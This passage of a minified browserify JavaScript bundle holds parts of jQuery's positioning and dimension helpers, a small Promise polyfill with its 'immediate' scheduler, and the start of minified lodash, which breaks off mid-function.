r.getBoundingClientRect!==ke&&(i=r.getBoundingClientRect()),n=I(o),{top:i.top+n.pageYOffset-t.clientTop,left:i.left+n.pageXOffset-t.clientLeft}):i},position:function(){if(this[0]){var e,t,n=this[0],r={top:0,left:0};return"fixed"===Z.css(n,"position")?t=n.getBoundingClientRect():(e=this.offsetParent(),t=this.offset(),Z.nodeName(e[0],"html")||(r=e.offset()),r.top+=Z.css(e[0],"borderTopWidth",!0),r.left+=Z.css(e[0],"borderLeftWidth",!0)),{top:t.top-r.top-Z.css(n,"marginTop",!0),left:t.left-r.left-Z.css(n,"marginLeft",!0)}}},offsetParent:function(){return this.map(function(){for(var e=this.offsetParent||Ft;e&&!Z.nodeName(e,"html")&&"static"===Z.css(e,"position");)e=e.offsetParent;return e||Ft})}}),Z.each({scrollLeft:"pageXOffset",scrollTop:"pageYOffset"},function(t,n){var r="pageYOffset"===n;Z.fn[t]=function(i){return me(this,function(t,i,o){var s=I(t);return void 0===o?s?s[n]:t[i]:void(s?s.scrollTo(r?e.pageXOffset:o,r?o:e.pageYOffset):t[i]=o)},t,i,arguments.length,null)}}),Z.each(["top","left"],function(e,t){Z.cssHooks[t]=T(Q.pixelPosition,function(e,n){return n?(n=w(e,t),Be.test(n)?Z(e).position()[t]+"px":n):void 0})}),Z.each({Height:"height",Width:"width"},function(e,t){Z.each({padding:"inner"+e,content:t,"":"outer"+e},function(n,r){Z.fn[r]=function(r,i){var o=arguments.length&&(n||"boolean"!=typeof r),s=n||(r===!0||i===!0?"margin":"border");return me(this,function(t,n,r){var i;return Z.isWindow(t)?t.document.documentElement["client"+e]:9===t.nodeType?(i=t.documentElement,Math.max(t.body["scroll"+e],i["scroll"+e],t.body["offset"+e],i["offset"+e],i["client"+e])):void 0===r?Z.css(t,n,s):Z.style(t,n,r,s)},t,o?r:void 0,o,null)}})}),Z.fn.size=function(){return this.length},Z.fn.andSelf=Z.fn.addBack,"function"==typeof define&&define.amd&&define("jquery",[],function(){return Z});var Pt=e.jQuery,Rt=e.$;return Z.noConflict=function(t){return e.$===Z&&(e.$=Rt),t&&e.jQuery===Z&&(e.jQuery=Pt),Z},typeof t===ke&&(e.jQuery=e.$=Z),Z});
},{}],7:[function(require,module,exports){
"use strict";function INTERNAL(){}module.exports=INTERNAL;
},{}],8:[function(require,module,exports){
"use strict";function all(e){function r(e,r){function i(e){o[r]=e,++l===t&!n&&(n=!0,handlers.resolve(s,o))}resolve(e).then(i,function(e){n||(n=!0,handlers.reject(s,e))})}if("[object Array]"!==Object.prototype.toString.call(e))return reject(new TypeError("must be an array"));var t=e.length,n=!1;if(!t)return resolve([]);for(var o=new Array(t),l=0,i=-1,s=new Promise(INTERNAL);++i<t;)r(e[i],i);return s}var Promise=require("./promise"),reject=require("./reject"),resolve=require("./resolve"),INTERNAL=require("./INTERNAL"),handlers=require("./handlers");module.exports=all;
},{"./INTERNAL":7,"./handlers":9,"./promise":11,"./reject":14,"./resolve":15}],9:[function(require,module,exports){
"use strict";function getThen(e){var t=e&&e.then;return e&&"object"==typeof e&&"function"==typeof t?function(){t.apply(e,arguments)}:void 0}var tryCatch=require("./tryCatch"),resolveThenable=require("./resolveThenable"),states=require("./states");exports.resolve=function(e,t){var r=tryCatch(getThen,t);if("error"===r.status)return exports.reject(e,r.value);var u=r.value;if(u)resolveThenable.safely(e,u);else{e.state=states.FULFILLED,e.outcome=t;for(var a=-1,s=e.queue.length;++a<s;)e.queue[a].callFulfilled(t)}return e},exports.reject=function(e,t){e.state=states.REJECTED,e.outcome=t;for(var r=-1,u=e.queue.length;++r<u;)e.queue[r].callRejected(t);return e};
},{"./resolveThenable":16,"./states":17,"./tryCatch":18}],10:[function(require,module,exports){
module.exports=exports=require("./promise"),exports.resolve=require("./resolve"),exports.reject=require("./reject"),exports.all=require("./all"),exports.race=require("./race");
},{"./all":8,"./promise":11,"./race":13,"./reject":14,"./resolve":15}],11:[function(require,module,exports){
"use strict";function Promise(e){if(!(this instanceof Promise))return new Promise(e);if("function"!=typeof e)throw new TypeError("resolver must be a function");this.state=states.PENDING,this.queue=[],this.outcome=void 0,e!==INTERNAL&&resolveThenable.safely(this,e)}var unwrap=require("./unwrap"),INTERNAL=require("./INTERNAL"),resolveThenable=require("./resolveThenable"),states=require("./states"),QueueItem=require("./queueItem");module.exports=Promise,Promise.prototype["catch"]=function(e){return this.then(null,e)},Promise.prototype.then=function(e,t){if("function"!=typeof e&&this.state===states.FULFILLED||"function"!=typeof t&&this.state===states.REJECTED)return this;var s=new Promise(INTERNAL);if(this.state!==states.PENDING){var r=this.state===states.FULFILLED?e:t;unwrap(s,r,this.outcome)}else this.queue.push(new QueueItem(s,e,t));return s};
},{"./INTERNAL":7,"./queueItem":12,"./resolveThenable":16,"./states":17,"./unwrap":19}],12:[function(require,module,exports){
"use strict";function QueueItem(e,t,l){this.promise=e,"function"==typeof t&&(this.onFulfilled=t,this.callFulfilled=this.otherCallFulfilled),"function"==typeof l&&(this.onRejected=l,this.callRejected=this.otherCallRejected)}var handlers=require("./handlers"),unwrap=require("./unwrap");module.exports=QueueItem,QueueItem.prototype.callFulfilled=function(e){handlers.resolve(this.promise,e)},QueueItem.prototype.otherCallFulfilled=function(e){unwrap(this.promise,this.onFulfilled,e)},QueueItem.prototype.callRejected=function(e){handlers.reject(this.promise,e)},QueueItem.prototype.otherCallRejected=function(e){unwrap(this.promise,this.onRejected,e)};
},{"./handlers":9,"./unwrap":19}],13:[function(require,module,exports){
"use strict";function race(e){function r(e){resolve(e).then(function(e){n||(n=!0,handlers.resolve(i,e))},function(e){n||(n=!0,handlers.reject(i,e))})}if("[object Array]"!==Object.prototype.toString.call(e))return reject(new TypeError("must be an array"));var t=e.length,n=!1;if(!t)return resolve([]);for(var o=-1,i=new Promise(INTERNAL);++o<t;)r(e[o]);return i}var Promise=require("./promise"),reject=require("./reject"),resolve=require("./resolve"),INTERNAL=require("./INTERNAL"),handlers=require("./handlers");module.exports=race;
},{"./INTERNAL":7,"./handlers":9,"./promise":11,"./reject":14,"./resolve":15}],14:[function(require,module,exports){
"use strict";function reject(e){var r=new Promise(INTERNAL);return handlers.reject(r,e)}var Promise=require("./promise"),INTERNAL=require("./INTERNAL"),handlers=require("./handlers");module.exports=reject;
},{"./INTERNAL":7,"./handlers":9,"./promise":11}],15:[function(require,module,exports){
"use strict";function resolve(e){if(e)return e instanceof Promise?e:handlers.resolve(new Promise(INTERNAL),e);var r=typeof e;switch(r){case"boolean":return FALSE;case"undefined":return UNDEFINED;case"object":return NULL;case"number":return ZERO;case"string":return EMPTYSTRING}}var Promise=require("./promise"),INTERNAL=require("./INTERNAL"),handlers=require("./handlers");module.exports=resolve;var FALSE=handlers.resolve(new Promise(INTERNAL),!1),NULL=handlers.resolve(new Promise(INTERNAL),null),UNDEFINED=handlers.resolve(new Promise(INTERNAL),void 0),ZERO=handlers.resolve(new Promise(INTERNAL),0),EMPTYSTRING=handlers.resolve(new Promise(INTERNAL),"");
},{"./INTERNAL":7,"./handlers":9,"./promise":11}],16:[function(require,module,exports){
"use strict";function safelyResolveThenable(e,r){function a(r){n||(n=!0,handlers.reject(e,r))}function t(r){n||(n=!0,handlers.resolve(e,r))}function s(){r(t,a)}var n=!1,l=tryCatch(s);"error"===l.status&&a(l.value)}var handlers=require("./handlers"),tryCatch=require("./tryCatch");exports.safely=safelyResolveThenable;
},{"./handlers":9,"./tryCatch":18}],17:[function(require,module,exports){
exports.REJECTED=["REJECTED"],exports.FULFILLED=["FULFILLED"],exports.PENDING=["PENDING"];
},{}],18:[function(require,module,exports){
"use strict";function tryCatch(t,r){var s={};try{s.value=t(r),s.status="success"}catch(u){s.status="error",s.value=u}return s}module.exports=tryCatch;
},{}],19:[function(require,module,exports){
"use strict";function unwrap(e,r,t){immediate(function(){var n;try{n=r(t)}catch(a){return handlers.reject(e,a)}n===e?handlers.reject(e,new TypeError("Cannot resolve promise with itself")):handlers.resolve(e,n)})}var immediate=require("immediate"),handlers=require("./handlers");module.exports=unwrap;
},{"./handlers":9,"immediate":20}],20:[function(require,module,exports){
(function (global){
"use strict";function nextTick(){draining=!0;for(var e,n,t=queue.length;t;){for(n=queue,queue=[],e=-1;++e<t;)n[e]();t=queue.length}draining=!1}function immediate(e){1!==queue.push(e)||draining||scheduleDrain()}var Mutation=global.MutationObserver||global.WebKitMutationObserver,scheduleDrain;if(Mutation){var called=0,observer=new Mutation(nextTick),element=global.document.createTextNode("");observer.observe(element,{characterData:!0}),scheduleDrain=function(){element.data=called=++called%2}}else if(global.setImmediate||"undefined"==typeof global.MessageChannel)scheduleDrain="document"in global&&"onreadystatechange"in global.document.createElement("script")?function(){var e=global.document.createElement("script");e.onreadystatechange=function(){nextTick(),e.onreadystatechange=null,e.parentNode.removeChild(e),e=null},global.document.documentElement.appendChild(e)}:function(){setTimeout(nextTick,0)};else{var channel=new global.MessageChannel;channel.port1.onmessage=nextTick,scheduleDrain=function(){channel.port2.postMessage(0)}}var draining,queue=[];module.exports=immediate;
}).call(this,typeof global !== "undefined" ? global : typeof self !== "undefined" ? self : typeof window !== "undefined" ? window : {})
},{}],21:[function(require,module,exports){
(function (global){
(function(){function n(n,t){if(n!==t){var r=null===n,e=n===b,u=n===n,i=null===t,o=t===b,f=t===t;if(n>t&&!i||!u||r&&!o&&f||e&&f)return 1;if(t>n&&!r||!f||i&&!e&&u||o&&u)return-1}return 0}function t(n,t,r){for(var e=n.length,u=r?e:-1;r?u--:++u<e;)if(t(n[u],u,n))return u;return-1}function r(n,t,r){if(t!==t)return h(n,r);for(var e=r-1,u=n.length;++e<u;)if(n[e]===t)return e;return-1}function e(n){return"function"==typeof n||!1}function u(n){return null==n?"":n+""}function i(n,t){for(var r=-1,e=n.length;++r<e&&t.indexOf(n.charAt(r))>-1;);return r}function o(n,t){for(var r=n.length;r--&&t.indexOf(n.charAt(r))>-1;);return r}function f(t,r){return n(t.criteria,r.criteria)||t.index-r.index}function a(t,r,e){for(var u=-1,i=t.criteria,o=r.criteria,f=i.length,a=e.length;++u<f;){var c=n(i[u],o[u]);if(c){if(u>=a)return c;var l=e[u];return c*("asc"===l||l===!0?1:-1)}}return t.index-r.index}function c(n){return qn[n]}function l(n){return Mn[n]}function s(n,t,r){return t?n=Vn[n]:r&&(n=Yn[n]),"\\"+n}function p(n){return"\\"+Yn[n]}function h(n,t,r){for(var e=n.length,u=t+(r?0:-1);r?u--:++u<e;){var i=n[u];if(i!==i)return u}return-1}function v(n){return!!n&&"object"==typeof n}function _(n){return 160>=n&&n>=9&&13>=n||32==n||160==n||5760==n||6158==n||n>=8192&&(8202>=n||8232==n||8233==n||8239==n||8287==n||12288==n||65279==n)}function g(n,t){for(var r=-1,e=n.length,u=-1,i=[];++r<e;)n[r]===t&&(n[r]=D,i[++u]=r);return i}function y(n,t){for(var r,e=-1,u=n.length,i=-1,o=[];++e<u;){var f=n[e],a=t?t(f,e,n):f;e&&r===a||(r=a,o[++i]=f)}return o}function d(n){for(var t=-1,r=n.length;++t<r&&_(n.charCodeAt(t)););return t}function m(n){for(var t=n.length;t--&&_(n.charCodeAt(t)););return t}function w(n){return Pn[n]}function x(_){function G(n){if(v(n)&&!Cf(n)&&!(n instanceof qn)){if(n instanceof nn)return n;if(no.call(n,"__chain__")&&no.call(n,"__wrapped__"))return he(n)}return new nn(n)}function H(){}function nn(n,t,r){this.__wrapped__=n,this.__actions__=r||[],this.__chain__=!!t}function qn(n){this.__wrapped__=n,this.__actions__=[],this.__dir__=1,this.__filtered__=!1,this.__iteratees__=[],this.__takeCount__=Oo,this.__views__=[]}function Mn(){var n=new qn(this.__wrapped__);return n.__actions__=et(this.__actions__),n.__dir__=this.__dir__,n.__filtered__=this.__filtered__,n.__iteratees__=et(this.__iteratees__),n.__takeCount__=this.__takeCount__,n.__views__=et(this.__views__),n}function Pn(){if(this.__filtered__){var n=new qn(this);n.__dir__=-1,n.__filtered__=!0}else n=this.clone(),n.__dir__*=-1;return n}function Kn(){var n=this.__wrapped__.value(),t=this.__dir__,r=Cf(n),e=0>t,u=r?n.length:0,i=Vr(0,u,this.__views__),o=i.start,f=i.end,a=f-o,c=e?f:o-1,l=this.__iteratees__,s=l.length,p=0,h=Ao(a,this.__takeCount__);if(!r||T>u||u==a&&h==a)return er(e&&r?n.reverse():n,this.__actions__);var v=[];n:for(;a--&&h>p;){c+=t;for(var _=-1,g=n[c];++_<s;){var y=l[_],d=y.iteratee,m=y.type,w=d(g);if(m==B)g=w;else if(!w){if(m==L)continue n;break n}}v[p++]=g}return v}function Vn(){this.__data__={}}function Yn(n){return this.has(n)&&delete this.__data__[n]}function Gn(n){return"__proto__"==n?b:this.__data__[n]}function Jn(n){return"__proto__"!=n&&no.call(this.__data__,n)}function Xn(n,t){return"__proto__"!=n&&(this.__data__[n]=t),this}function Zn(n){var t=n?n.length:0;for(this.data={hash:go(null),set:new lo};t--;)this.push(n[t])}function Hn(n,t){var r=n.data,e="string"==typeof t||Wu(t)?r.set.has(t):r.hash[t];return e?0:-1}function Qn(n){var t=this.data;"string"==typeof n||Wu(n)?t.set.add(n):t.hash[n]=!0}function rt(n,t){for(var r=-1,e=n.length,u=-1,i=t.length,o=zi(e+i);++r<e;)o[r]=n[r];for(;++u<i;)o[r++]=t[u];return o}function et(n,t){var r=-1,e=n.length;for(t||(t=zi(e));++r<e;)t[r]=n[r];return t}function ut(n,t){for(var r=-1,e=n.length;++r<e&&t(n[r],r,n)!==!1;);return n}function it(n,t){for(var r=n.length;r--&&t(n[r],r,n)!==!1;);return n}function ot(n,t){for(var r=-1,e=n.length;++r<e;)if(!t(n[r],r,n))return!1;return!0}function ft(n,t,r,e){for(var u=-1,i=n.length,o=e,f=o;++u<i;){var a=n[u],c=+t(a);r(c,o)&&(o=c,f=a)}return f}function at(n,t){for(var r=-1,e=n.length,u=-1,i=[];++r<e;){var o=n[r];t(o,r,n)&&(i[++u]=o)}return i}function ct(n,t){for(var r=-1,e=n.length,u=zi(e);++r<e;)u[r]=t(n[r],r,n);return u}function lt(n,t){for(var r=-1,e=t.length,u=n.length;++r<e;)n[u+r]=t[r];return n}function st(n,t,r,e){var u=-1,i=n.length;for(e&&i&&(r=n[++u]);++u<i;)r=t(r,n[u],u,n);return r}function pt(n,t,r,e){var u=n.length;for(e&&u&&(r=n[--u]);u--;)r=t(r,n[u],u,n);return r}function ht(n,t){for(var r=-1,e=n.length;++r<e;)if(t(n[r],r,n))return!0;return!1}function vt(n,t){for(var r=n.length,e=0;r--;)e+=+t(n[r])||0;return e}function _t(n,t){return n===b?t:n}function gt(n,t,r,e){return n!==b&&no.call(e,r)?n:t}function yt(n,t,r){for(var e=-1,u=Df(t),i=u.length;++e<i;){var o=u[e],f=n[o],a=r(f,t[o],o,n,t);(a===a?a===f:f!==f)&&(f!==b||o in n)||(n[o]=a)}return n}function dt(n,t){return null==t?n:wt(t,Df(t),n)}function mt(n,t){for(var r=-1,e=null==n,u=!e&&Zr(n),i=u?n.length:0,o=t.length,f=zi(o);++r<o;){var a=t[r];u?f[r]=Hr(a,i)?n[a]:b:f[r]=e?b:n[a]}return f}function wt(n,t,r){r||(r={});for(var e=-1,u=t.length;++e<u;){var i=t[e];r[i]=n[i]}return r}function xt(n,t,r){var e=typeof n;return"function"==e?t===b?n:or(n,t,r):null==n?Ri:"object"==e?zt(n):t===b?Si(n):Dt(n,t)}function bt(n,t,r,e,u,i,o){var f;if(r&&(f=u?r(n,e,u):r(n)),f!==b)return f;if(!Wu(n))return n;var a=Cf(n);if(a){if(f=Yr(n),!t)return et(n,f)}else{var c=ro.call(n),l=c==Y;if(c!=X&&c!=q&&(!l||u))return Dn[c]?Jr(n,c,t):u?n:{};if(f=Gr(l?{}:n),!t)return dt(f,n)}i||(i=[]),o||(o=[]);for(var s=i.length;s--;)if(i[s]==n)return o[s];return i.push(n),o.push(f),(a?ut:$t)(n,function(e,u){f[u]=bt(e,t,r,u,n,i,o)}),f}function At(n,t,r){if("function"!=typeof n)throw new Ji(z);return so(function(){n.apply(b,r)},t)}function jt(n,t){var e=n?n.length:0,u=[];if(!e)return u;var i=-1,o=Mr(),f=o==r,a=f&&t.length>=T?_r(t):null,c=t.length;a&&(o=Hn,f=!1,t=a);n:for(;++i<e;){var l=n[i];if(f&&l===l){for(var s=c;s--;)if(t[s]===l)continue n;u.push(l)}else o(t,l,0)<0&&u.push(l)}return u}function kt(n,t){var r=!0;return No(n,function(n,e,u){return r=!!t(n,e,u)}),r}function It(n,t,r,e){var u=e,i=u;return No(n,function(n,o,f){var a=+t(n,o,f);(r(a,u)||a===e&&a===i)&&(u=a,i=n)}),i}function Rt(n,t,r,e){var u=n.length;for(r=null==r?0:+r||0,0>r&&(r=-r>u?0:u+r),e=e===b||e>u?u:+e||0,0>e&&(e+=u),u=r>e?0:e>>>0,r>>>=0;u>r;)n[r++]=t;return n}function Ot(n,t){var r=[];return No(n,function(n,e,u){t(n,e,u)&&r.push(n)}),r}function Et(n,t,r,e){var u;return r(n,function(n,r,i){return t(n,r,i)?(u=e?r:n,!1):void 0}),u}function Ct(n,t,r,e){e||(e=[]);for(var u=-1,i=n.length;++u<i;){var o=n[u];v(o)&&Zr(o)&&(r||Cf(o)||ku(o))?t?Ct(o,t,r,e):lt(e,o):r||(e[e.length]=o)}return e}function Ut(n,t){return Lo(n,t,ni)}function $t(n,t){return Lo(n,t,Df)}function St(n,t){return Bo(n,t,Df)}function Wt(n,t){for(var r=-1,e=t.length,u=-1,i=[];++r<e;){var o=t[r];Su(n[o])&&(i[++u]=o)}return i}function Ft(n,t,r){if(null!=n){r!==b&&r in se(n)&&(t=[r]);for(var e=0,u=t.length;null!=n&&u>e;)n=n[t[e++]];return e&&e==u?n:b}}function Nt(n,t,r,e,u,i){return n===t?!0:null==n||null==t||!Wu(n)&&!v(t)?n!==n&&t!==t:Tt(n,t,Nt,r,e,u,i)}function Tt(n,t,r,e,u,i,o){var f=Cf(n),a=Cf(t),c=M,l=M;f||(c=ro.call(n),c==q?c=X:c!=X&&(f=Mu(n))),a||(l=ro.call(t),l==q?l=X:l!=X&&(a=Mu(t)));var s=c==X,p=l==X,h=c==l;if(h&&!f&&!s)return Br(n,t,c);if(!u){var v=s&&no.call(n,"__wrapped__"),_=p&&no.call(t,"__wrapped__");if(v||_)return r(v?n.value():n,_?t.value():t,e,u,i,o)}if(!h)return!1;i||(i=[]),o||(o=[]);for(var g=i.length;g--;)if(i[g]==n)return o[g]==t;i.push(n),o.push(t);var y=(f?Lr:zr)(n,t,r,e,u,i,o);return i.pop(),o.pop(),y}function Lt(n,t,r){var e=t.length,u=e,i=!r;if(null==n)return!u;for(n=se(n);e--;){var o=t[e];if(i&&o[2]?o[1]!==n[o[0]]:!(o[0]in n))return!1}for(;++e<u;){o=t[e];var f=o[0],a=n[f],c=o[1];if(i&&o[2]){if(a===b&&!(f in n))return!1}else{var l=r?r(a,c,f):b;if(!(l===b?Nt(c,a,r,!0):l))return!1}}return!0}function Bt(n,t){var r=-1,e=Zr(n)?zi(n.length):[];return No(n,function(n,u,i){e[++r]=t(n,u,i)}),e}function zt(n){var t=Pr(n);if(1==t.length&&t[0][2]){var r=t[0][0],e=t[0][1];return function(n){return null==n?!1:n[r]===e&&(e!==b||r in se(n))}}return function(n){return Lt(n,t)}}function Dt(n,t){var r=Cf(n),e=ne(n)&&ee(t),u=n+"";return n=pe(n),function(i){if(null==i)return!1;var o=u;if(i=se(i),(r||!e)&&!(o in i)){if(i=1==n.length?i:Ft(i,Jt(n,0,-1)),null==i)return!1;o=Ie(n),i=se(i)}return i[o]===t?t!==b||o in i:Nt(t,i[o],b,!0)}}function qt(n,t,r,e,u){if(!Wu(n))return n;var i=Zr(t)&&(Cf(t)||Mu(t)),o=i?b:Df(t);return ut(o||t,function(f,a){if(o&&(a=f,f=t[a]),v(f))e||(e=[]),u||(u=[]),Mt(n,t,a,qt,r,e,u);else{var c=n[a],l=r?r(c,f,a,n,t):b,s=l===b;s&&(l=f),l===b&&(!i||a in n)||!s&&(l===l?l===c:c!==c)||(n[a]=l)}}),n}function Mt(n,t,r,e,u,i,o){for(var f=i.length,a=t[r];f--;)if(i[f]==a)return void(n[r]=o[f]);var c=n[r],l=u?u(c,a,r,n,t):b,s=l===b;s&&(l=a,Zr(a)&&(Cf(a)||Mu(a))?l=Cf(c)?c:Zr(c)?et(c):[]:zu(a)||ku(a)?l=ku(c)?Gu(c):zu(c)?c:{}:s=!1),i.push(a),o.push(l),s?n[r]=e(l,a,u,i,o):(l===l?l!==c:c===c)&&(n[r]=l)}function Pt(n){return function(t){return null==t?b:t[n]}}function Kt(n){var t=n+"";return n=pe(n),function(r){return Ft(r,n,t)}}function Vt(n,t){for(var r=n?t.length:0;r--;){var e=t[r];if(e!=u&&Hr(e)){var u=e;po.call(n,e,1)}}return n}function Yt(n,t){return n+yo(Io()*(t-n+1))}function Gt(n,t,r,e,u){return u(n,function(n,u,i){r=e?(e=!1,n):t(r,n,u,i)}),r}function Jt(n,t,r){var e=-1,u=n.length;t=null==t?0:+t||0,0>t&&(t=-t>u?0:u+t),r=r===b||r>u?u:+r||0,0>r&&(r+=u),u=t>r?0:r-t>>>0,t>>>=0;for(var i=zi(u);++e<u;)i[e]=n[e+t];return i}function Xt(n,t){var r;return No(n,function(n,e,u){return r=t(n,e,u),!r}),!!r}function Zt(n,t){var r=n.length;for(n.sort(t);r--;)n[r]=n[r].value;return n}function Ht(n,t,r){var e=Dr(),u=-1;t=ct(t,function(n){return e(n)});var i=Bt(n,function(n){var r=ct(t,function(t){return t(n)});return{criteria:r,index:++u,value:n}});return Zt(i,function(n,t){return a(n,t,r)})}function Qt(n,t){var r=0;return No(n,function(n,e,u){r+=+t(n,e,u)||0}),r}function nr(n,t){var e=-1,u=Mr(),i=n.length,o=u==r,f=o&&i>=T,a=f?_r():null,c=[];a?(u=Hn,o=!1):(f=!1,a=t?[]:c);n:for(;++e<i;){var l=n[e],s=t?t(l,e,n):l;if(o&&l===l){for(var p=a.length;p--;)if(a[p]===s)continue n;t&&a.push(s),c.push(l)}else u(a,s,0)<0&&((t||f)&&a.push(s),c.push(l))}return c}function tr(n,t){for(var r=-1,e=t.length,u=zi(e);++r<e;)u[r]=n[t[r]];return u}function rr(n,t,r,e){for(var u=n.length,i=e?u:-1;(e?i--:++i<u)&&t(n[i],i,n););return r?Jt(n,e?0:i,e?i+1:u):Jt(n,e?i+1:0,e?u:i)}function er(n,t){var r=n;r instanceof qn&&(r=r.value());for(var e=-1,u=t.length;++e<u;){var i=t[e];r=i.func.apply(i.thisArg,lt([r],i.args))}return r}function ur(n,t,r){var e=0,u=n?n.length:e;if("number"==typeof t&&t===t&&Uo>=u){for(;u>e;){var i=e+u>>>1,o=n[i];(r?t>=o:t>o)&&null!==o?e=i+1:u=i}return u}return ir(n,t,Ri,r)}function ir(n,t,r,e){t=r(t);for(var u=0,i=n?n.length:0,o=t!==t,f=null===t,a=t===b;i>u;){var c=yo((u+i)/2),l=r(n[c]),s=l!==b,p=l===l;if(o)var h=p||e;else h=f?p&&s&&(e||null!=l):a?p&&(e||s):null==l?!1:e?t>=l:t>l;h?u=c+1:i=c}return Ao(i,Co)}function or(n,t,r){if("function"!=typeof n)return Ri;if(t===b)return n;switch(r){case 1:return function(r){return n.call(t,r)};case 3:return function(r,e,u){return n.call(t,r,e,u)};case 4:return function(r,e,u,i){return n.call(t,r,e,u,i)};case 5:return function(r,e,u,i,o){return n.call(t,r,e,u,i,o)}}return function(){return n.apply(t,arguments)}}function fr(n){var t=new io(n.byteLength),r=new ho(t);return r.set(new ho(n)),t}function ar(n,t,r){for(var e=r.length,u=-1,i=bo(n.length-e,0),o=-1,f=t.length,a=zi(f+i);++o<f;)a[o]=t[o];for(;++u<e;)a[r[u]]=n[u];for(;i--;)a[o++]=n[u++];return a}function cr(n,t,r){for(var e=-1,u=r.length,i=-1,o=bo(n.length-u,0),f=-1,a=t.length,c=zi(o+a);++i<o;)c[i]=n[i];for(var l=i;++f<a;)c[l+f]=t[f];for(;++e<u;)c[l+r[e]]=n[i++];return c}function lr(n,t){return function(r,e,u){var i=t?t():{};if(e=Dr(e,u,3),Cf(r))for(var o=-1,f=r.length;++o<f;){var a=r[o];n(i,a,e(a,o,r),r)}else No(r,function(t,r,u){n(i,t,e(t,r,u),u)});return i}}function sr(n){return yu(function(t,r){var e=-1,u=null==t?0:r.length,i=u>2?r[u-2]:b,o=u>2?r[2]:b,f=u>1?r[u-1]:b;for("function"==typeof i?(i=or(i,f,5),u-=2):(i="function"==typeof f?f:b,u-=i?1:0),o&&Qr(r[0],r[1],o)&&(i=3>u?b:i,u=1);++e<u;){var a=r[e];a&&n(t,a,i)}return t})}function pr(n,t){return function(r,e){var u=r?qo(r):0;if(!re(u))return n(r,e);for(var i=t?u:-1,o=se(r);(t?i--:++i<u)&&e(o[i],i,o)!==!1;);return r}}function hr(n){return function(t,r,e){for(var u=se(t),i=e(t),o=i.length,f=n?o:-1;n?f--:++f<o;){var a=i[f];if(r(u[a],a,u)===!1)break}return t}}function vr(n,t){function r(){var u=this&&this!==nt&&this instanceof r?e:n;return u.apply(t,arguments)}var e=yr(n);return r}function _r(n){return go&&lo?new Zn(n):null}function gr(n){return function(t){for(var r=-1,e=ji(li(t)),u=e.length,i="";++r<u;)i=n(i,e[r],r);return i}}function yr(n){return function(){var t=arguments;switch(t.length){case 0:return new n;case 1:return new n(t[0]);case 2:return new n(t[0],t[1]);case 3:return new n(t[0],t[1],t[2]);case 4:return new n(t[0],t[1],t[2],t[3]);case 5:return new n(t[0],t[1],t[2],t[3],t[4]);case 6:return new n(t[0],t[1],t[2],t[3],t[4],t[5]);case 7:return new n(t[0],t[1],t[2],t[3],t[4],t[5],t[6])}var r=Fo(n.prototype),e=n.apply(r,t);return Wu(e)?e:r}}function dr(n){function t(r,e,u){u&&Qr(r,e,u)&&(e=b);var i=Tr(r,n,b,b,b,b,b,e);return i.placeholder=t.placeholder,i}return t}function mr(n,t){return yu(function(r){var e=r[0];return null==e?e:(r.push(t),n.apply(b,r))})}function wr(n,t){return function(r,e,u){if(u&&Qr(r,e,u)&&(e=b),e=Dr(e,u,3),1==e.length){r=Cf(r)?r:le(r);var i=ft(r,e,n,t);if(!r.length||i!==t)return i}return It(r,e,n,t)}}function xr(n,r){return function(e,u,i){if(u=Dr(u,i,3),Cf(e)){var o=t(e,u,r);return o>-1?e[o]:b}return Et(e,u,n)}}function br(n){return function(r,e,u){return r&&r.length?(e=Dr(e,u,3),t(r,e,n)):-1}}function Ar(n){return function(t,r,e){return r=Dr(r,e,3),Et(t,r,n,!0)}}function jr(n){return function(){for(var t,r=arguments.length,e=n?r:-1,u=0,i=zi(r);n?e--:++e<r;){var o=i[u++]=arguments[e];if("function"!=typeof o)throw new Ji(z);!t&&nn.prototype.thru&&"wrapper"==qr(o)&&(t=new nn([],!0))}for(e=t?-1:r;++e<r;){o=i[e];var f=qr(o),a="wrapper"==f?Do(o):b;t=a&&te(a[0])&&a[1]==(U|R|E|$)&&!a[4].length&&1==a[9]?t[qr(a[0])].apply(t,a[3]):1==o.length&&te(o)?t[f]():t.thru(o)}return function(){var n=arguments,e=n[0];if(t&&1==n.length&&Cf(e)&&e.length>=T)return t.plant(e).value();for(var u=0,o=r?i[u].apply(this,n):e;++u<r;)o=i[u].call(this,o);return o}}}function kr(n,t){return function(r,e,u){return"function"==typeof e&&u===b&&Cf(r)?n(r,e):t(r,or(e,u,3))}}function Ir(n){return function(t,r,e){return("function"!=typeof r||e!==b)&&(r=or(r,e,3)),n(t,r,ni)}}function Rr(n){return function(t,r,e){return("function"!=typeof r||e!==b)&&(r=or(r,e,3)),n(t,r)}}function Or(n){return function(t,r,e){var u={};return r=Dr(r,e,3),$t(t,function(t,e,i){var o=r(t,e,i);e=n?o:e,t=n?t:o,u[e]=t}),u}}function Er(n){return function(t,r,e){return t=u(t),(n?t:"")+Sr(t,r,e)+(n?"":t)}}function Cr(n){var t=yu(function(r,e){var u=g(e,t.placeholder);return Tr(r,n,b,e,u)});return t}function Ur(n,t){return function(r,e,u,i){var o=arguments.length<3;return"function"==typeof e&&i===b&&Cf(r)?n(r,e,u,o):Gt(r,Dr(e,i,4),u,o,t)}}function $r(n,t,r,e,u,i,o,f,a,c){function l(){for(var m=arguments.length,w=m,x=zi(m);w--;)x[w]=arguments[w];if(e&&(x=ar(x,e,u)),i&&(x=cr(x,i,o)),v||y){var A=l.placeholder,I=g(x,A);if(m-=I.length,c>m){var R=f?et(f):b,O=bo(c-m,0),U=v?I:b,$=v?b:I,S=v?x:b,W=v?b:x;t|=v?E:C,t&=~(v?C:E),_||(t&=~(j|k));var F=[n,t,r,S,U,W,$,R,a,O],N=$r.apply(b,F);return te(n)&&Mo(N,F),N.placeholder=A,N}}var T=p?r:this,L=h?T[n]:n;return f&&(x=ae(x,f)),s&&a<x.length&&(x.length=a),this&&this!==nt&&this instanceof l&&(L=d||yr(n)),L.apply(T,x)}var s=t&U,p=t&j,h=t&k,v=t&R,_=t&I,y=t&O,d=h?b:yr(n);return l}function Sr(n,t,r){var e=n.length;if(t=+t,e>=t||!wo(t))return"";var u=t-e;return r=null==r?" ":r+"",gi(r,_o(u/r.length)).slice(0,u)}function Wr(n,t,r,e){function u(){for(var t=-1,f=arguments.length,a=-1,c=e.length,l=zi(c+f);++a<c;)l[a]=e[a];for(;f--;)l[a++]=arguments[++t];var s=this&&this!==nt&&this instanceof u?o:n;return s.apply(i?r:this,l)}var i=t&j,o=yr(n);return u}function Fr(n){var t=Pi[n];return function(n,r){return r=r===b?0:+r||0,r?(r=ao(10,r),t(n*r)/r):t(n)}}function Nr(n){return function(t,r,e,u){var i=Dr(e);return 